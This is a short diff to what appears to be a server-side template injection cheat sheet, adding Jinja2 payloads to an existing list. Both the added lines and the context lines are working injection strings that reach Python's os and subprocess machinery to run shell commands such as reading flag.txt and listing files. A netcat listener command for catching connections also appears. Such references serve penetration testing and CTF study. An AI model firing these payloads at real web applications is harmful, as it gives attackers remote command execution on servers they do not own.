@@ -383,6 +383,8 @@ nv -lnvp 8000
 ```python
 {{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
 {{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('ls -lah').read()}}
+{{().__class__.__bases__[0].__subclasses__()[405]}}
 ```
 
 #### Exploit the SSTI by calling Popen without guessing the offset
